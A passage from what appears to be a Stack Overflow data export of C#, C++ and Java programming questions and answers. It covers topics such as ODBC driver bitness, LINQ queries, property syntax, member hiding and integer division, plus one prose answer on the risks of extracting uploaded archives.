  (*.dbf)};collatingsequence=ASCII;dbq=d:\Data\88;deleted=0;driverid=277;fil=dBase
  IV;maxbuffersize=2048;maxscanrows=8;pagetimeout=600;safetransactions=0;statistics=0;threads=3;uid=admin;usercommitsync=Yes</p>
</blockquote>

<p>it is made by visual studio itself.<br>
and this is my code  </p>

<pre><code>DataSet1TableAdapters.AN10TableAdapter _AN10TableAdapter = new DataSet1TableAdapters.AN10TableAdapter();  
_AN10TableAdapter.Fill(D_Data.AN10);
</code></pre>

<p>and this is the error  </p>

<blockquote>
  <p>ERROR [IM002] [Microsoft][ODBC Driver
  Manager] Data source name not found
  and no default driver specified</p>
</blockquote>

<p>this real joke is killing me.<br>
platform:vista x64<br>
language:c#.net<br>
.netframework vesion:3.5<br>
worked on it:10 days  </p>
","33708","","<p>I guess the issue is the 64-bitness of your machine. The driver is an unmanaged component and you probably have a single version of it (32-bit or 64-bit) installed on your machine. Since you cannot load 32-bit unmanaged components in a 64 bit process (and vice versa), it'll not work. Switch the target CPU setting of your project to x64 and x86 to force the assembly to run with the appropriate bitness and retry. It's likely to solve your problem.</p>
"
"<p>I'm looking to nest dictionaries inside of one another in order to house x y coordinates of blocks.  So I would have </p>

<pre><code>IDictionary&lt;IDictionary&lt;int, int&gt;, IDictionary&lt;int, int&gt;&gt;
</code></pre>

<p>and the key Dictionary would house the column, row combination while the value Dictionary would house the x and y coordinates.  It will be used to draw a 2D wireframe after users input values for the blocks on the plane.</p>

<p>I have a couple of questions:
1) What possible pitfalls might I run into?
2) Is there a better approach for this challenge?</p>

<p>Thank you</p>

<p><em>Update</em> Not sure how to mark the answer since two different suggestions led to the used solution.  I ended up with:</p>

<pre><code>IDictionary&lt;KeyValuePair&lt;int, int&gt;, Point&gt;
</code></pre>

<p>and each block sets the x, y coordinates for the next block to its right and next block below.</p>

<p>This is a combination of answers by Mehrdad Afshari, Reed Copsey and CSharpAtl for the KeyValuePair and Cory Charlton for the Point.</p>

<p>If there is a way to mark more than one answer please let me know, but otherwise I'm just marking the first answer in the list as the answer.</p>
","33708","","<p>Are you trying to map a pair of integers to a dictionary? If this is the case, you should probably use something like:</p>

<pre><code>Dictionary&lt;Tuple&lt;int, int&gt;, Dictionary&lt;int,int&gt;&gt;
</code></pre>

<p>What you are currently doing maps an <code>IDictionary</code> object, which is a reference type, to another <code>IDictionary</code> instance. It just checks the reference equality (identity) of the key and won't consider the contents of the key dictionary at all.</p>

<p>If you are trying to map a key consisting of a set of values to a dictionary (e.g. can be useful in memoization and dynamic programming), you need to declare your own comparer to compare the contents of the keys rather than solely considering their references. </p>
"
"<p>I'd like to create following functionality for my web-based application:</p>

<ol>
<li>user uploads an archive file (zip/rar/tar.gz/tar.bz etc) (content - several image files)</li>
<li>archive is automatically extracted after upload</li>
<li>images are shown in the HTML list (whatever)</li>
</ol>

<p>Are there any security issues involved with extraction process? E.g. possibility of malicious code execution contained within uploaded files (or well-prepared archive file), or else?</p>
","33708","","<p>Aside the possibility of exploiting the system with things like buffer overflows if it's not implemented carefully, there can be issues if you blindly extract a well crafted compressed file with a large file with redundant patterns inside (a zip bomb). The compressed version is very small but when you extract, it'll take up the whole disk causing denial of service and possibly crashing the system.</p>

<p>Also, if you are not careful enough, the client might hand a zip file with server-side executable contents (<code>.php</code>, <code>.asp</code>, <code>.aspx</code>, ...) inside and request the file over HTTP, which, if not configured properly can result in arbitrary code execution on the server.</p>
"
"<p>Just I want to find any of the <strong>intColl</strong> of <strong>CustomerData</strong> is of single digit in length and select that customerData.</p>

<pre><code>List&lt;CustomerData&gt; cdata = new List&lt;CustomerData&gt;();

cdata.Add(
           new CustomerData { Key = 1, Name = ""Marc"",
                              intColl = new List&lt;int&gt;() { 1, 2, 3 }
                             }
         );


cdata.Add(
           new CustomerData { Key = 2, Name = ""Eric"",
                             intColl = new List&lt;int&gt;() { 11, 12, 13 }
                            }
         );


cdata.Add(
           new CustomerData { Key = 3, Name = ""Peter"", 
                              intColl = new List&lt;int&gt;() { 111, 112, 113 }
                             }
         );  


cdata.Add(
            new CustomerData { Key = 4, Name = ""Peter"",
                               intColl = new List&lt;int&gt;() { 1111, 1112, 1113 }
                             }
          );
</code></pre>

<p>when executing the following </p>

<pre><code>var query = cdata.Any(d =&gt; d.intColl.Find(c =&gt; c == 1));
</code></pre>

<p>I receive</p>

<p><code>Cannot implicitly convert type 'int' to 'bool'.</code></p>
","33708","","<p>While the query you've written should be written as,</p>

<pre><code>var query = cdata.Any(d =&gt; d.intColl.Contains(1));
</code></pre>

<p>I think, based on your question text, you should be doing:</p>

<pre><code>var query = cdata.Any(d =&gt; d.intColl.Any(c =&gt; c &lt; 10 &amp;&amp; c &gt;= 0));
</code></pre>

<p>And to return the actual object (per the comment):</p>

<pre><code>var query = cdata.FirstOrDefault(d =&gt; d.intColl.Any(c =&gt; c &lt; 10 &amp;&amp; c &gt;= 0));
if (query == null) { /* nothing fits the criteria */ }
else { /* use `query` object */ }
</code></pre>
"
"<p>How does a developer do the equivalent of this in managed c++? :</p>

<p>c# code</p>

<pre><code>public String SomeValue
{
  get;
  set;
}
</code></pre>

<p>I've scoured the net and found some solutions, however it is hard to distinguish which is the correct (latest, .NET 3.5) way, given the colourful history of getters/setters and managed c++.</p>

<p>Thanks!</p>
","33708","","<p>Managed C++ does not support automatic properties. You should manually declare a backing field and the accessors:</p>

<pre><code>private: String* _internalSomeValue;
public:
__property String* get_SomeValue() { return _internalSomeValue; }
__property void set_SomeValue(String *value) { _internalSomeValue = value; }
</code></pre>

<p>C++/CLI supports automatic properties with a very simple syntax:</p>

<pre><code>public: property String^ SomeValue;
</code></pre>

<h3>Update (reply to comment):</h3>

<p>In C++/CLI, you cannot control the accessibility of each accessor method separately when you use the automatic property syntax. You need to define the backing field and the methods yourself:</p>

<pre><code>private: String^ field;
property String^ SomeValue { 
   public: String^ get() { return field; }
   private: void set(String^ value) { field = value; }
}
</code></pre>
"
"<p>I am learning LINQ.Several examples use ObjectDumper class.What is the use of ObjectDumper class ?</p>
","33708","","<p>It's a helper class defined in the sample that prints out the contents of the sequence and properties of an object to the console so that you can investigate it. It uses reflection to do so.</p>
"
"<p>While developing my application i came across some comparison stuff here was it:</p>

<pre><code>    string str = ""12345"";
    int j = 12345;
    if (str == j.ToString())
    {
        //do my logic
    }
</code></pre>

<p>I was thinking that the above stuff can also be done with:</p>

<pre><code>    string str = ""12345"";
    int j = 12345;
    if (Convert.ToInt32(str) == j)
    {
        //do my logic
    }
</code></pre>

<p>So i developed a sample code to test in terms of performance which one is better</p>

<pre><code>        var iterationCount = 1000000;
        var watch = new Stopwatch();
        watch.Start();
        string str = ""12345"";
        int j = 12345;
        for (var i = 0; i &lt; iterationCount; i++)
        {
            if (str == j.ToString())
            {
                //do my logic
            }
        }
        watch.Stop();
</code></pre>

<p>And second one:</p>

<pre><code>  var iterationCount = 1000000;
    var watch = new Stopwatch();
    watch.Start();
    string str = ""12345"";
    int j = 12345;
    for (var i = 0; i &lt; iterationCount; i++)
    {
        if (Convert.ToInt32(str) == j)
        {
            //do my logic
        }
    }
    watch.Stop();
</code></pre>

<p>On running the above two tests i found the above tests were giving nearly the same time elapsed. I would like to discuss which one is the better approach? And is there any other approach better than two above two?</p>
","33708","","<p>I prefer <code>i.ToString() == str</code> since nothing guarantees that <code>Convert.ToInt32(str)</code> doesn't fail.</p>
"
"<p>Hello stack overflowers, 
Here is the problem i am facing, does anyone have solution?</p>

<pre><code>Class A: public class B
{
 // I want to pass a reference of B to Function
}

void ClassC::Function(class&amp; B)
{
  //do stuff
}
</code></pre>
","33708","","<p>The way you are declaring the class is wrong:</p>

<pre><code>class A : public B // no more class keyword here
{

}; // note the semicolon

void ClassC::Function(const B &amp;b) // this is how you declare a parameter of type B&amp;
{
}
</code></pre>

<p>You simply need to pass the object of type <code>A</code> to the <code>Function</code>. It'll work.
It's good to declare the parameter as <code>const</code> if you want to take derived types too.
To pass the <code>this</code> instance, you'd simply call:</p>

<pre><code>classCObject.Function(*this);
</code></pre>
"
"<p>Consider this:</p>

<pre><code>class A  {
    int x =5;
}

class B extends A{
        int x =6;
    }
public class CovariantTest {

    public A getObject() {
        return new A();
    }

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) {
        // TODO code application logic here
        CovariantTest c1 = new SubCovariantTest();
        System.out.println(c1.getObject().x);
    }

}

class SubCovariantTest extends CovariantTest {
    public B getObject(){
        return new B();
    }
}
</code></pre>

<p>As far as I know, the JVM chooses a method based on the true type of its object. Here the true type is SubCovariantTest, which has defined an overriding method getObject. </p>

<p>The program prints 5, instead of 6. Why?</p>
","33708","","<p>The method is indeed chosen by the runtime type of the object. What is not chosen by the runtime type is the integer <strong>field</strong> <code>x</code>. Two copies of <code>x</code> exist for the <code>B</code> object, one for <code>A.x</code> and one for <code>B.x</code>. You are <em>statically</em> choosing the field from <code>A</code> class, as the <em>compile-time</em> type of the object returned by <code>getObject</code> is <code>A</code>. This fact can be verified by adding a method to <code>A</code> and <code>B</code>:</p>

<pre><code>class A  {
    public String print() {
        return ""A"";
    }
}

class B extends A {
    public String print() {
        return ""B"";
    }
}
</code></pre>

<p>and changing the test expression to:</p>

<pre><code>System.out.println(c1.getObject().print());
</code></pre>
"
"<p>MSDN says:</p>

<blockquote>
  <p>When used as a modifier, the new
  keyword explicitly hides a member
  inherited from a base class. When you
  hide an inherited member, the derived
  version of the member replaces the
  base-class version. Although you can
  hide members without the use of the
  new modifier, the result is a warning.
  If you use new to explicitly hide a
  member, it suppresses this warning and
  documents the fact that the derived
  version is intended as a replacement.</p>
</blockquote>

<p>Example:</p>

<pre><code>class Base
{
 int value;

 virtual bool Foo()
 {
   value++;
 }
}

class Derived : Base
{
 int value;

 override bool Foo()
 {
  value++;
 }

}
</code></pre>

<p>Do I have to add <code>new</code> modifier to Derived.value declaration? What changes?</p>
","33708","","<p>Since the <code>value</code> field is <code>private</code>, it's not accessible in the derived class. Thus, the declaration in the derived class does not really hide anything. You shouldn't add <code>new</code> to the declaration. If you do, nothing changes, except the compiler will warn you about using <code>new</code> incorrectly. If the <code>value</code> field was accessible in the derived class (e.g. it was <code>public</code>), then you should have used <code>new</code> to express your intention to hide the base member:</p>

<pre><code>class A {
    public int field;
}
class B : A {
    public int field; // warning. `B.field` hides `A.field`. 
}
</code></pre>

<p>Using <code>new</code> will silence that warning (it will have no other effect):</p>

<pre><code>class B : A {
    public new int field; // Dear compiler, shut up please.
}
</code></pre>

<p>You can't declare a method as both <code>override</code> and <code>new</code>. They are mutually exclusive.</p>
"
"<p>I'm wondering why <code>List&lt;T&gt;.ForEach(Action&lt;T&gt;)</code> exists.</p>

<p>Is there any benefit/difference in doing :</p>

<pre><code>elements.ForEach(delegate(Element element){ element.DoSomething(); });
</code></pre>

<p>over</p>

<pre><code>foreach(Element element in elements) { element.DoSomething();}
</code></pre>

<p>?</p>
","33708","","<p>It's <a href=""http://diditwith.net/2006/10/05/PerformanceOfForeachVsListForEach.aspx"" rel=""nofollow"">very likely to be faster</a> (you shouldn't choose one over the other merely because of the small performance benefits, unless you're dealing with computationally heavy number crunching or graphics application and you need to get the most out of processor cycles) and you can pass delegates directly to it which may be convenient in some cases:</p>

<pre><code>list.ForEach(Console.WriteLine); // dumps the list to console.
</code></pre>
"
"<p>This is causing a StackOverFlow error and I have an idea why, but I would like a little more detail on why and is my solution for it the way it should be handled.  Ok, first things first, the following code causes a StackOverFlow error when I try to assign a value to the property:</p>

<pre><code>private List&lt;Albums&gt; albums
{
    get
    {
        if (Session[""albums""] != null)
            return (List&lt;Albums&gt;)Session[""albums""];
        else
            return AlbumCollection.GetAlbums();
    }
    set
    {
    albums = value;
    Session[""albums""] = albums;
    }
}
</code></pre>

<p>To resolve the above, I changed the name of the property and added another variable to hold the value of the property which resolved the StackOverFlow issue:</p>

<pre><code>private List&lt;Albums&gt; albums = null;
private List&lt;Albums&gt; Albums
{
    get
    {
        if (Session[""albums""] != null)
            return (List&lt;Albums&gt;)Session[""albums""];
        else
            return AlbumCollection.GetAlbums();
    }
    set
    {
    albums = value;
    Session[""albums""] = albums;
    }
}
</code></pre>

<p>Also, am I doing the setter correct, assigning the value and then assigning the Session[""albums""] the value in albums?  Could I have just done,  Session[""albums""] = value instead?</p>
","33708","","<p>The problem is with this line:</p>

<pre><code>albums = value;
</code></pre>

<p>You are recursively setting the property to <code>value</code> which will call the setter again and again, until it stackoverflows. There's no point in that line of code. Just get rid of it. </p>

<p>I guess there's a false misconception that a property needs to be bound to a field or something. It's not. A property, by itself, is just a couple unrelated methods, that are not required to have any specific relation to each other or to a field. When you retrieve the property value, you just call its <code>get</code> method and use the return value and when you set its value, you call its <code>set</code> method with the appropriate <code>value</code> argument. You don't need to somehow ""change"" the property value in setter. The semantics are automatically enforced as you are changing the value that <code>get</code> is going to return so the next time you call get, it will return <code>Session[""...""]</code> which you have already changed. </p>
"
"<p>When I write like this:</p>

<pre><code>class A {
    public: virtual void foo() = 0;
}

class B {
    public: void foo() {}
}
</code></pre>

<p>...B::foo() becomes virtual as well. What is the rationale behind this? I would expect it to behave like the <code>final</code> keyword in Java.</p>

<p>Add: I know that works like this and how a vtable works :)  The question is, why C++ standard committee did not leave an opening to call B::foo() directly and avoid a vtable lookup.</p>
","33708","","<p>When you declare a <code>virtual</code> method, you're basically adding a new entry in the vtable. Overriding a <code>virtual</code> method changes the value of that entry; it doesn't remove it. This is basically true for languages like Java or C# too. The difference is that, with <code>final</code> keyword in Java, you can ask the compiler to arbitrarily <em>enforce</em> not being able to override it. C++ does not provide this language feature.</p>
"
"<p>Is there any <a href=""http://en.wikipedia.org/wiki/GPGPU"" rel=""nofollow"">GPGPU</a> library for iPhone?</p>
","33708","","<p>The original iPhone and iPhone 3G support <a href=""http://developer.apple.com/iphone/library/documentation/3DDrawing/Conceptual/OpenGLES%5FProgrammingGuide/OpenGLESontheiPhone/OpenGLESontheiPhone.html#//apple%5Fref/doc/uid/TP40008793-CH101-SW1"" rel=""nofollow"">only support OpenGL ES 1.1</a> fixed-function pipeline and do not provide a programmable pipeline (no shaders) and therefore cannot be used as general purpose computation devices, at least at the OpenGL abstraction layer.</p>

<p>iPhone 3GS and iPod touch 3G support OpenGL ES 2.0 programmable pipeline. However, it looks like there are limitations like lack of antialiased shaders. </p>

<p>Regardless of the support for programmable shaders in 3GS, I don't think the GPU is powerful enough to be used as a general purpose computational engine.</p>
"
"<p>I solely work with web applications, so I have virtually no real experience with Windows Forms designed in .NET.</p>

<p>I'm reading up on assemblies, and there are two types; static, which comes in .dll form, and exectuable, which comes in .exe form.</p>

<p>As far as I can work out, an 'executable assembly' is just another name for a compiled application (that is, a console application or a Windows Forms application).</p>

<p>Can you clarify it?</p>

<p>Edit: My terminology comes from this article: <a href=""http://msdn.microsoft.com/en-us/library/k3677y81%28VS.71%29.aspx"" rel=""nofollow"">http://msdn.microsoft.com/en-us/library/k3677y81%28VS.71%29.aspx</a></p>

<p>Edit 2: OK, so now, as I understand it, you have static and dynamic assemblies, static exists on disk, dyanmic is created on the fly/on demand. 
Secondly, you have executable assemblies, which are our applications, such as a console application like <code>helloworld.exe</code>.</p>
","33708","","<p>I've never heard of the term ""static assembly"" for executable files or class libraries. Basically, a .NET assembly can have an entry point. The ones that have an entry point and are executable directly from the operating system shell (or the CLI runtime, to be more accurate) are "".exe"" files and the ones that don't have an entry point and are used merely as supporting libraries of other applications are stored as "".dll"" files.</p>

<h3>Update:</h3>

<p>Looking at the reference you provided, it's clear what it means from a ""static assembly"":</p>

<blockquote>
  <p>Assemblies can be static or dynamic. Static assemblies can include .NET Framework types (interfaces and classes), as well as resources for the assembly (bitmaps, JPEG files, resource files, and so on). Static assemblies are stored on disk in portable executable (PE) files. You can also use the .NET Framework to create dynamic assemblies, which are run directly from memory and are not saved to disk before execution. You can save dynamic assemblies to disk after they have executed.</p>
</blockquote>

<p>The MSDN article is calling the assemblies stored as files on disk ""static assemblies"", as opposed to ""dynamic assemblies"" that are generated at runtime by some code (e.g. classes in <a href=""http://msdn.microsoft.com/en-us/library/system.reflection.emit.aspx"" rel=""nofollow"">System.Reflection.Emit</a> namespace). It doesn't matter whether they are DLLs or EXEs (both of the file types have a Portable Executable (PE) header, as well as a CLR header). Only thing that matters is that they are not generated dynamically (hence the term ""static"") and are previously stored on disk. Outside the context of dynamically generated assemblies, the term ""static assembly"" is rarely used.</p>
"
"<p>I've been doing some performance testing, mainly so I can understand the difference between iterators and simple for loops. As part of this I created a simple set of tests and was then totally surprised by the results. For some methods, 64 bit was nearly 10 times faster than 32 bit.</p>

<p>What I'm looking for is some explanation for why this is happening. </p>

<p>[The answer below states this is due to 64 bit arithmetic in a 32 bit app. Changing the longs to ints results in good performance on 32 and 64 bit systems.]</p>

<p>Here are the 3 methods in question.</p>

<pre><code>private static long ForSumArray(long[] array)
{
    var result = 0L;
    for (var i = 0L; i &lt; array.LongLength; i++)
    {
        result += array[i];
    }
    return result;
}

private static long ForSumArray2(long[] array)
{
    var length = array.LongLength;
    var result = 0L;
    for (var i = 0L; i &lt; length; i++)
    {
        result += array[i];
    }
    return result;
}

private static long IterSumArray(long[] array)
{
    var result = 0L;
    foreach (var entry in array)
    {
        result += entry;
    }
    return result;
}
</code></pre>

<p>I have a simple test harness that tests this</p>

<pre><code>var repeat = 10000;

var arrayLength = 100000;
var array = new long[arrayLength];
for (var i = 0; i &lt; arrayLength; i++)
{
    array[i] = i;
}

Console.WriteLine(""For: {0}"", AverageRunTime(repeat, () =&gt; ForSumArray(array)));

repeat = 100000;
Console.WriteLine(""For2: {0}"", AverageRunTime(repeat, () =&gt; ForSumArray2(array)));
Console.WriteLine(""Iter: {0}"", AverageRunTime(repeat, () =&gt; IterSumArray(array)));

private static TimeSpan AverageRunTime(int count, Action method)
{
    var stopwatch = new Stopwatch();
    stopwatch.Start();
    for (var i = 0; i &lt; count; i++)
    {
        method();
    }
    stopwatch.Stop();
    var average = stopwatch.Elapsed.Ticks / count;
    return new TimeSpan(average);
}
</code></pre>

<p>When I run these, I get the following results:<br>
32 bit:</p>

<pre>For: 00:00:00.0006080
For2: 00:00:00.0005694
Iter: 00:00:00.0001717</pre>

<p>64 bit</p>

<pre>For: 00:00:00.0007421
For2: 00:00:00.0000814
Iter: 00:00:00.0000818</pre>

<p>The things I read from this are that using LongLength is slow. If I use array.Length, performance for the first for loop is pretty good in 64 bit, but not 32 bit.</p>

<p>The other thing I read from this is that iterating over an array is as efficient as a for loop, and the code is much cleaner and easier to read!</p>
","33708","","<p>x64 processors contain 64 bit general purpose registers with which they can calculate operations on 64 bit integers in a single instruction. 32 bit processors does not have that. This is especially relevant to your program as it's heavily using <code>long</code> (64-bit integer) variables.</p>

<p>For instance, in x64 assembly, to add a couple 64 bit integers stored in registers, you can simply do:</p>

<pre><code>; adds rbx to rax
add rax, rbx
</code></pre>

<p>To do the same operation on a 32 bit x86 processor, you'll have to use two registers and manually use the carry of the first operation in the second operation:</p>

<pre><code>; adds ecx:ebx to edx:eax
add eax, ebx
adc edx, ecx
</code></pre>

<p>More instructions and less registers mean more clock cycles, memory fetches, ... which will ultimately result in reduced performance. The difference is very notable in number crunching applications.</p>

<p>For .NET applications, it seems that the 64-bit JIT compiler performs more aggressive optimizations improving overall performance.</p>

<p>Regarding your point about array iteration, the C# compiler is clever enough to recognize <code>foreach</code> over arrays and treat them specially. The generated code is identical to using a <code>for</code> loop and it's in recommended that you use <code>foreach</code> if you don't need to change the array element in the loop. Besides that, the runtime recognizes the pattern <code>for (int i = 0; i &lt; a.Length; ++i)</code> and omits the bound checks for array accesses inside the loop. This will not happen in the <code>LongLength</code> case and will result in decreased performance (both for 32 bit and 64 bit case); and since you'll be using <code>long</code> variables with <code>LongLength</code>, the 32 bit performance will get degraded even more.</p>
"
"<p>There's <em>a lot</em> of homework questions here on SO.</p>

<p>I would guess that 90%+ can be solved by stepping through the code in a debugger, and observing program/variable state.</p>

<p>I was never taught to use a debugger.  I simply printed and read the GDB manual and stepped through their examples.  When I used Visual Studio for the first time, I remembered thinking, Wow! how much simpler can this be, click to set a breakpoint, mouse over a variable for the value, press a key to step, the immediate window, debug.print, etc...</p>

<p>At any rate, are students ""taught"" to use a debugger?  If not, why not?  (Perhaps a better question is, why can't they learn to use a debugger themselves... maybe they need to be <em>told</em> that there is such a tool that can help them...)</p>

<p>How long does it take to learn to use a debugger?</p>
","33708","","<p>I don't think the problem is teaching. Using a modern graphical debugger is not rocket science (at least not for most user-mode programs running on a single computer). The problem is with the attitudes of some people. In order to use a debugger effectively, you should:</p>

<ul>
<li>Admit <a href=""http://www.codinghorror.com/blog/archives/001079.html"" rel=""nofollow"">it's <strong>your fault</strong></a> and <a href=""http://www.pragprog.com/the-pragmatic-programmer/extracts/tips"" rel=""nofollow""><code>select</code> isn't broken</a>.</li>
<li>Have the perseverance to spend a couple nights debugging, without forgetting the previous point. </li>
<li>There's no specific algorithm to follow. You should guess educatedly and reason effectively from what you see.</li>
</ul>

<p>Not many non-programmers have these attitudes.  At college, I have seen many friends who give up after a relatively short period of time and bring me some code and tell me the computer is doing something wrong. I usually tell them I trust their computer more than them (and this hurts some feelings, but that's the way it is).</p>
"
"<p>In c# if I use <code>decimal</code> (lower case 'd'), the IDE shows it in dark blue (like <code>int</code>). If I use <code>Decimal</code> (upper case 'd'), the IDE shows it in teal (like a class name). In both cases the tooltip is <code>struct System.Decimal</code>.</p>

<p>Is there any difference? Is one ""preferred""?</p>
","33708","","<p><code>decimal</code> is a keyword and always refers to the struct <code>System.Decimal</code> defined in base class library. <code>Decimal</code> usually means the same thing as most people have <code>using System;</code> on top of their source code. However, strictly speaking, those are not identical (you can't blindly find-and-replace them):</p>

<pre><code> namespace Test {
    class Decimal { }
 }

 // File2.cs
 using Test;
 class DecimalIsNotdecimal {
      void Method(decimal d) { ... }
      void Method(Decimal d) { ... } // works!
 }
</code></pre>
"
"<p>I am rendering a list of tickers to html via xslt and I would like for the list to be comma deliimited.  Assuming I was going to use xsl:for-each...</p>

<pre><code>&lt;xsl:for-each select=""/Tickers/Ticker""&gt;
    &lt;xsl:value-of select=""TickerSymbol""/&gt;,
&lt;/xsl:for-each&gt;
</code></pre>

<p>What is the best way to get rid of the trailing comma? Is there something better than xsl:for-each?</p>
","33708","","<pre><code>&lt;xsl:for-each select=""/Tickers/Ticker""&gt;
    &lt;xsl:if test=""position() &gt; 1""&gt;, &lt;/xsl:if&gt;
    &lt;xsl:value-of select=""TickerSymbol""/&gt;
&lt;/xsl:for-each&gt;
</code></pre>
"
"<p>I have a list of strings. All of the strings have whitespace that needs to be converted to underscores. I am fully capable of using a <code>for</code> or <code>foreach</code> loop to do this. I am still relatively new to C# and would like to become more familiar with it. With that said, my question is:</p>

<p>How can I get the following code to work in .NET 2.0? When I check <code>fieldList</code> at the end of the <code>ConvertAll</code> operation, nothing has changed. Is there an issue with passing the string by value instead of reference?</p>

<pre><code>string fields =
  ""First Name,Middle Name,Last Name,Birth Date,Gender,Address,City,State,Zip,Email"";
List&lt;string&gt; fieldList = new List&lt;string&gt;(fields.Split(','));
fieldList.ConvertAll&lt;string&gt;(new Converter&lt;string, string&gt;(
    delegate(string str)
    {
        str = str.Trim();
        str = str.Replace(' ', '_');
        return str;
    }
));
</code></pre>

<p>Please, keep in mind, that I am using .NET 2.0 and cannot currently switch, so I do not have the luxury of using LINQ or Lambdas.</p>
","33708","","<p><code>ConvertAll</code> doesn't change the input list. It returns a new list containing the converted stuff. By the way, you can remove the <code>new Converter&lt;string,string&gt;</code> with C# 2.0+:</p>

<pre><code>List&lt;string&gt; converted = fieldList.ConvertAll&lt;string&gt;
    (delegate(string s) { return s.Trim().Replace(' ', '_'); });
</code></pre>

<p>Besides, nothing prevents you from using a C# 3.0 compiler and <a href=""http://www.albahari.com/nutshell/linqbridge.aspx"" rel=""nofollow"">LINQBridge</a> and target .NET 2.0.</p>
"
"<p>If I have VB declaration like this <code>Public ReadOnly Property Document() As XmlDocument</code>, what is its C# equivalent? Thanks.</p>
","33708","","<p>You can use automatic properties in C# 3.0+ to achieve the same thing:</p>

<pre><code>public XmlDocument Document { get; private set; }
</code></pre>
"
"<p>I have an IEnumerable of the following object:</p>

<pre><code>public class Recipient  
{  
    public  int UserID { get; set; }
    public  string Name { get; set; }
}
</code></pre>

<p>So, I have an <code>IEnumerable<code>&lt;Recipient</code>> Recipients</code>, and I'd like to do a .Contains() on Recipients.  Except, I'd like to do a .contains() on each recipients UserID, to see if my Recipients contain a particular userID.</p>

<p>If I just had an <code>IEnumerable<code>&lt;Int</code>> Recipients</code>, it would be easy to do <code>Recipients.Contains(5);</code></p>

<p>But, because I'm trying to get a property of the collection, how do I use Contains in that instance? </p>
","33708","","<pre><code>Recipients.Any(r =&gt; r.UserID == 5)
</code></pre>

<p>Alternatively, you can map the collection to a collection of <code>UserID</code> values and perform a <code>Contains</code> there:</p>

<pre><code>Recipients.Select(r =&gt; r.UserID).Contains(5)
</code></pre>
"
"<pre><code>Public class ClassB : ClassA
{
}

public class GeneralClass
{
   public ClassA test
   {
      get{}
      set{}
   }
}
public class specificClass :GeneralClass
{
   public ClassB test
   {
      get{}
      set{}
   }
}
</code></pre>

<p>As you can see the property test is inherited in specificClass from generalClass but here I want to change the type to ClassB (<code>ClassB:ClassA</code>) . can I do something like this so anytime I'm using the <code>specializedClass.test</code> I don't need to typecast it to classB ?</p>

<p>edit 1 : I forgot to mention that now it's giving me the warning that <strong>test hide inherited member test .use new keyword if hiding is intended .</strong></p>
","33708","","<p>You can't modify the return type as you override methods and properties. C# doesn't support <a href=""http://en.wikipedia.org/wiki/Covariant%5Freturn%5Ftype"" rel=""nofollow"">return type covariance</a>.</p>

<p>By the way, if you don't need to override the property and just want to return the base value casted to some specific type, you can declare a <em><a href=""http://stackoverflow.com/questions/1922550/new-modifier-in-c""><code>new</code> property</a></em> to hide the base class one. Note that it's not return type covariance. It's just a distinct property that happens to have an identical name:</p>

<pre><code>public new ClassB test {
     get { return base.test as ClassB; }
     set { base.test = value; }
}
</code></pre>
"
"<p>If you create new projects in C# and VB.NET, then go directly in the Immediate Window and type this:</p>

<pre><code>? 567 / 1000
</code></pre>

<p>C# will return 0, while VB.NET will return 0.567.</p>

<p>To get the same result in C#, you need to type</p>

<pre><code>? 567 / 1000.0
</code></pre>

<p>Why is there this difference? Why does C# require the explicit decimal point after 1000?</p>
","33708","","<p>The <a href=""http://msdn.microsoft.com/en-us/library/3b1ff23f.aspx"">/ operator in C#</a> for <strong>integer operands</strong> does the ""integer division"" operation (equivalent to <a href=""http://msdn.microsoft.com/en-us/library/0e16fywh%28VS.80%29.aspx"">\ operator in VB.NET</a>). For VB.NET, it's the ""normal"" division (will give fractional result). In C#, in order to do that, you'll have to cast at least one operand to a floating point type (e.g. <code>double</code>) explicitly.</p>
"
"<p>By executing the following i can get the information about methods</p>

<pre><code>Type t=typeof(someType);

MemberInfo[] mInfo = t.GetMethods();
</code></pre>

<p>how to get information about delegates declared inside a type?</p>
","33708","","<p>Call <a href=""http://msdn.microsoft.com/en-us/library/493t6h7t.aspx""><code>Type.GetNestedTypes</code></a> to get the nested types and filter them by being a delegate (check whether they inherit from <a href=""http://msdn.microsoft.com/en-us/library/system.multicastdelegate.aspx""><code>System.MulticastDelegate</code></a>):</p>

<pre><code>static IEnumerable&lt;Type&gt; GetNestedDelegates(Type type)
{
    return type.GetNestedTypes(BindingFlags.Public | BindingFlags.NonPublic)
               .Where(t =&gt; t.BaseType == typeof(MulticastDelegate));
}
</code></pre>
"
"<p>Given the following code sample:</p>

<pre><code>public class WeirdStuff {

	public static int doSomething() {
		while(true);
	}

	public static void main(String[] args) {
		doSomething();
	}
}
</code></pre>

<p>This is a valid Java program, although the method doSomething() should return an int but never does. If you run it, it will end in an infinite loop. If you put the argument of the while loop in a separate variable (e.g. boolean bool = true) the compiler will tell you to return an int in this method.</p>

<p>So my question is: is this somewhere in the Java specification and are there situation where this behavior might be useful?</p>
","33708","","<p>Java specification defines a concept called <a href=""http://java.sun.com/docs/books/jls/third%5Fedition/html/statements.html#14.21"">Unreachable statements</a>. You are not allowed to have an unreachable statement in your code (it's a compile time error). A <code>while(true);</code> statement makes the following statements unreachable by definition. You are not even allowed to have a <code>return</code> statement after the <code>while(true);</code> statement in Java. Note that while <a href=""http://en.wikipedia.org/wiki/Halting%5Fproblem"">Halting problem</a> is undecidable in generic case, the definition of Unreachable Statement is more strict than just halting. It's deciding <strong>very specific cases</strong> where a program definitely does not halt. The compiler is theoretically not able to detect <strong>all</strong> infinite loops and unreachable statements but it has to detect specific cases defined in the spec.</p>
"
"<p>When we bid for Government RFP's they usually ask us to use 'Open source technologies'. Since Microsoft.NET framework is free to use, can it be considered 'open source technology' for this purpose?</p>
","33708","","<p>Microsoft's implementation of the <a href=""http://www.ecma-international.org/publications/standards/Ecma-335.htm"">Common Language Infrastructure</a>, <a href=""http://msdn.microsoft.com/net"">Microsoft .NET Framework</a>, is not licensed under an <a href=""http://www.opensource.org"">Open Source Initiative</a> approved open source license. Currently, the <a href=""http://weblogs.asp.net/scottgu/archive/2008/01/16/net-framework-library-source-code-now-available.aspx"">source code of some class libraries</a> are available under <a href=""http://www.microsoft.com/resources/sharedsource/referencesourcelicense.mspx"">Microsoft Reference Source License</a> for the aid of debugging, and you are not allowed to use it for other purposes. Several libraries, like <a href=""http://www.asp.net/mvc"">ASP.NET MVC</a> are published under <a href=""http://www.opensource.org/licenses/ms-pl.html"">Microsoft Public License (Ms-PL)</a>, which is approved by OSI as an open source license. There are open source implementations of the CLI out there; most notably, the <a href=""http://www.mono-project.com"">Mono project</a> is available.</p>
"
"<p>I have a Controller that pulls images from a database, re-sizes them, caches the result on disk, and spits the image out as a <code>Content()</code> result.</p>

